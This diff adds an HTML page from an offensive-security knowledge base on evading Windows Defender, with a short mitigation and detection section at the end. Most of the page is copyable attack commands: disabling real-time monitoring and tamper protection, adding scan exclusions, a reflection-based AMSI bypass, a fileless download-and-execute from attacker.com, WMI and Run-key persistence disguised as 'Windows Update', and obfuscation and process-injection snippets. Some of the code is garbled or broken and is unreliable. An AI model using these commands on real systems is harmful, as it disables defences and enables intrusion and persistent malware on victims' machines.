@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Windows Defender Evasion | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-high { background: rgba(255,136,0,0.2); color: #ff8800; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="index.html">Windows Security</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Windows Security</a> / Defender Evasion
+    </div>
+    <div class="page-header">
+      <span class="severity-badge severity-high"><i class="fas fa-exclamation-triangle"></i> High Severity | T1562.001</span>
+      <h1>🛡️ Windows Defender Evasion</h1>
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE</strong><span>T1562.001</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>Windows 10/11</span></div>
+        <div class="meta-item"><strong>Phase</strong><span>Defense Evasion</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Medium</span></div>
+      </div>
+    </div>
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>Windows Defender (Microsoft Defender Antivirus) is an integrated anti-malware solution that uses signatures, heuristics, and machine learning to detect threats. Evasion techniques exploit blind spots in real-time protection, signature gaps, and configuration weaknesses to run malicious code undetected.</p>
+      <div class="vulnerability-box">
+        <strong>Detection Methods to Bypass:</strong>
+        <ul>
+          <li><strong>Real-time Protection:</strong> Behavior monitoring, script protection</li>
+          <li><strong>Cloud-Delivered Protection:</strong> Rapid signature updates from cloud</li>
+          <li><strong>Heuristic Analysis:</strong> Suspicious API patterns, process behavior</li>
+          <li><strong>AMSI:</strong> Anti-Malware Scan Interface for script inspection</li>
+          <li><strong>Behavior Monitoring:</strong> Parent-child process relationships</li>
+        </ul>
+      </div>
+    </div>
+    <div class="content-section" id="disabling">
+      <h2>💣 Disabling/Modifying Defender</h2>
+      <p><strong>1. Disable Real-Time Protection:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># PowerShell - Disable real-time monitoring
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Disable behavior monitoring
+Set-MpPreference -DisableBehaviorMonitoring $true
+
+# Disable script scanning
+Set-MpPreference -DisableScriptScanning $true
+
+# Disable cloud-delivered protection
+Set-MpPreference -DisableCloudBlock $true
+
+# Disable sample submission
+Set-MpPreference -SubmitSamplesConsent NeverSend</pre>
+      </div>
+      <p><strong>2. Tamper Protection Bypass:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check if tamper protection is enabled
+Get-MpComputerStatus | Select-Object TamperProtection
+
+# If disabled via Group Policy, can disable via registry
+REG ADD "HKLM\Software\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f
+
+# Or via WDigest modification (requires elevation)
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t REG_DWORD /d 4 /f
+
+# Wait and restart Defender
+sc start WinDefend</pre>
+      </div>
+      <p><strong>3. Exclusions (Persistence):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Add folder exclusion
+Add-MpPreference -ExclusionPath "C:\Tools"
+
+# Add process exclusion
+Add-MpPreference -ExclusionProcess "powershell.exe"
+
+# Add extension exclusion
+Add-MpPreference -ExclusionExtension ".txt"
+
+# Verify exclusions
+Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess</pre>
+      </div>
+    </div>
+    <div class="content-section" id="amsi-bypass">
+      <h2>🔓 AMSI Bypass</h2>
+      <p><strong>AMSI Bypass Techniques:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Patch AmsiScanBuffer (PowerShell)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Alternative - patch after load
+# Use reflection to access internal types
+
+# Python AMSI bypass
+# Hook AmsiScanBuffer to return AMSI_RESULT_CLEAN</pre>
+      </div>
+      <p><strong>Evade PowerShell Script Scanning:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Base64 encode your script
+$script = @"
+Write-Host "Evil payload"
+"@
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
+powershell -enc $encoded
+
+# Use compression
+$compressed = [System.IO.Compression.GZipStream]::new([System.IO.MemoryStream]::new([Convert]::FromBase64String($data)),[System.IO.Compression.CompressionMode]::Decompress)
+
+# XOR obfuscation
+$key = 0x42
+foreach ($byte in [System.Text.Encoding]::ASCII.GetBytes($script)) {
+    [byte]($byte -bxor $key)
+}</pre>
+      </div>
+    </div>
+    <div class="content-section" id="file-less">
+      <h2>📄 Fileless Evasion</h2>
+      <p><strong>1. Memory-Only Execution:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Download and execute in memory
+IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/payload.ps1")
+
+# Using Invoke-Expression
+$url = "http://attacker.com/evil.exe"
+$bytes = (New-Object Net.WebClient).DownloadData($url)
+$process = [System.Reflection.Assembly]::Load($bytes)
+$process.EntryPoint.Invoke($null, $null)
+
+# Bypass by not writing to disk</pre>
+      </div>
+      <p><strong>2. WMI Event Subscription (Persistence):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create permanent WMI event
+$filter = @"Namespace: root\subscription
+Class: __EventFilter
+Name: EvilFilter
+EventNamespace: root\cimv2
+QueryLanguage: WQL
+Query: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'
+"@
+
+# PowerShell one-liner for execution
+$payload = 'powershell -enc JABjAGwAYQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAIgBoAHQAdABwADoALwAvAHMAYQBuAGMAaQBuAGUALgB0AGUALgBhAHQAawBvAC4AYwBvAG0AIgAgAC0ATgBvAHIAaQAgAHsAIABpAGYAKAAkAHsAIABjAGEAdABjAGEAdABjAGEAYwAgAC0ARgBvAHIAYwBhAGwAIAAkAHsAIABiAGEAdABjAHMAIAB9ACkAIAB9AA=='
+
+Register-WmiEvent -Namespace "root\subscription" -Name "EvilTask" -ScriptBlock { Invoke-Expression $payload }</pre>
+      </div>
+      <p><strong>3. Registry-Based Execution:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Run key for persistence (no AV bypass, but good for persistence)
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Update" /d "powershell -enc ..."
+
+# Registry autorun location
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run</pre>
+      </div>
+    </div>
+    <div class="content-section" id="obfuscation">
+      <h2>🎭 Obfuscation Techniques</h2>
+      <p><strong>1. String Obfuscation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Split strings
+$com = "Comp" + "uter"
+$man = "Manage" + "ment"
+
+# Use CHAR array
+$cmd = [char]69 + [char]86 + [char]73 + [char]76
+
+# Variable expansion
+${env:ProgramFiles(x86)} = "C:\Windows"
+${Path} = "path"
+
+Invoke-Expression "$env:SystemRoot\System32\cmd.exe"</pre>
+      </div>
+      <p><strong>2. Command Obfuscation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Space injection
+cmd.exe /c whoami
+cmd.exe /c" "whoami
+cmd.exe /c who;ami
+
+# Caret substitution
+cmd.exe /c who^ami
+
+# Quotes
+cmd.exe /c "whoami"
+
+# Variable expansion
+%:~0,4%%:~8,4% = cmd.exe (using substring expansion)</pre>
+      </div>
+      <p><strong>3. Compiled Payloads:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Compile C# inline with PowerShell
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Evil {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+}
+"@
+
+# Compile VB.NET or C# to .exe
+# Use Donut for shellcode conversion
+donut -i payload.bin -o output.exe</pre>
+      </div>
+    </div>
+    <div class="content-section" id="process-injection">
+      <h2>💉 Process Injection</h2>
+      <p><strong>Classic Injection Techniques:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
+# Target legitimate process (e.g., notepad.exe)
+
+# PowerShell implementation
+$process = Get-Process notepad
+$address = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (GetProcAddress ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress ([System.Runtime.InteropServices.Marshal]::LoadLibrary("kernel32.dll")),"VirtualAllocEx").Invoke($null,[IntPtr]::Zero,0x1000,0x3000,0x40)))),
+    (New-Object System.Runtime.InteropServices.Marshal).Copy($shellcode, 0, [IntPtr]::Add($process.Handle, $address), $shellcode.Length)
+
+# Use CSK or SharpC2 for automated injection</pre>
+      </div>
+      <p><strong>Process Hollowing (RunPE):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Spawn legit process in suspended state
+# Unmap its memory
+# Write malicious image
+# Resume thread
+
+# Tools like donut, sRDI make this easier</pre>
+      </div>
+    </div>
+    <div class="content-section" id="network">
+      <h2>🌐 Network Evasion</h2>
+      <p><strong>Beacon Communication:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># HTTPS C2 (certificate validation can be bypassed)
+# Use legitimate sites for C2 (Twitter, GitHub)
+
+# Domain fronting (use CDN)
+# Connect to legitimate domain, but Host header points to C2
+
+# DNS C2 (long polling, small responses)
+# Use DGA (Domain Generation Algorithm)
+
+# Encrypted channels
+# Use TLS 1.3, certificate pinning</pre>
+      </div>
+      <p><strong>Web Traffic Mimicry:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Look like normal browser traffic
+# Use User-Agent of popular browsers
+# Mimic request patterns (GET /style.css, etc.)
+# Add common headers (Accept, Accept-Language)</pre>
+      </div>
+    </div>
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+      <div class="mitigation-box">
+        <strong>✅ Defender Hardening:</strong>
+        <ul>
+          <li><strong>Enable Tamper Protection:</strong> Prevent Defender modification</li>
+          <li><strong>Enable Cloud-Delivered Protection:</strong> Rapid threat response</li>
+          <li><strong>Enable Attack Surface Reduction:</strong> ASR rules block common techniques</li>
+          <li><strong>Deploy EDR:</strong> Defender + Sentinel/Defender for Endpoint</li>
+          <li><strong>Disable PowerShell v2:</strong> Remove legacy scripting</li>
+          <li><strong>Monitor Script Execution:</strong> ASR rules for PowerShell</li>
+        </ul>
+      </div>
+    </div>
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+      <p><strong>Sysmon Event Monitoring:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Monitor PowerShell script block logs
+# Event ID 4104 - Script Block Logging
+
+# Monitor AMSI bypass attempts
+# Event ID 1102 - Log cleared
+
+# Monitor Defender modification
+# Check for "MpPreference" modification
+
+# Use Hunting query in MDE
+DeviceRegistryEvents
+| where RegistryKey contains "MpPreference"
+| where ActionType == "RegistryValueModified"</pre>
+      </div>
+      <p><strong>Sigma Rules:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>title: Disable Windows Defender
+id: disable-defender
+detection:
+  selection:
+    EventID: 1
+    CommandLine|contains:
+      - 'Set-MpPreference'
+      - 'DisableRealtimeMonitoring'
+      - 'MpPreference'
+  condition: selection
+level: critical</pre>
+      </div>
+    </div>
+    <div class="content-section" id="tools">
+      <h2>🛠️ Tools</h2>
+      <ul>
+        <li><strong>Donut:</strong> Shellcode to EXE/DLL converter</li>
+        <li><strong>Unicorn:</strong> PowerShell downgrade and delivery</li>
+        <li><strong>Meta Twin:</strong> Embed payloads in legit binaries</li>
+        <li><strong>SharpC2/Brute Ratel:</strong> C2 frameworks with evasion</li>
+        <li><strong>Invoke-Obfuscation:</strong> PowerShell obfuscation framework</li>
+      </ul>
+    </div>
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://github.com/S3cur3Th1sSh1t/AmsiScanBufferBypass" target="_blank">AMSI Bypass Collection</a></li>
+        <li><a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank">Invoke-Obfuscation</a></li>
+        <li><a href="https://github.com/TheWover/donut" target="_blank">Donut</a></li>
+        <li><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/configure-attack-surface-reduction" target="_blank">ASR Rules</a></li>
+      </ul>
+    </div>
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Windows Security</a>
+  </div>
+</main>
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); text.textContent = 'Light'; }
+      else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); text.textContent = 'Dark'; }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  if (localStorage.getItem('theme-preference') === 'light') document.body.classList.add('light');
+});
+function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.textContent = 'Copied!'; setTimeout(() => { btn.textContent = 'Copy'; }, 2000); }
+</script>
+</body>
+</html>
